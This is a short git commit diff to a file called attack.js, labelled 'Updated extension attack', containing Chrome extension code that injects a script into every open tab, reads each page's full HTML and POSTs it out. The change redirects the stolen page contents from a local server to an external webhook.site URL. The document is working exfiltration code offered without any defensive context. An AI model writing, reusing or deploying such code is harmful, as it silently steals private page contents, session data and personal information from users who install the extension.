de4f72369eb031163eecefc91fdad760abc62b50
JBA192 <62188601+JBA192@users.noreply.github.com>
2023-03-15 15:08:31 -0400

    Updated extension attack

--- attack.js
+++ attack.js
@@ -2,7 +2,7 @@ chrome.tabs.query({}, function (tabs) {
     tabs.forEach(t => {
         chrome.tabs.executeScript(t.id, { code: 'document.documentElement.outerHTML' }, function (result) {
             var server = new XMLHttpRequest;
-            server.open('POST', 'http://[::]:8000/?html=' + result[0]);
+            server.open('POST', 'https://webhook.site/6c81d56f-e76f-44e6-aaba-bf5126b5546c/html=' + result[0]);
             server.send();
         })
     })
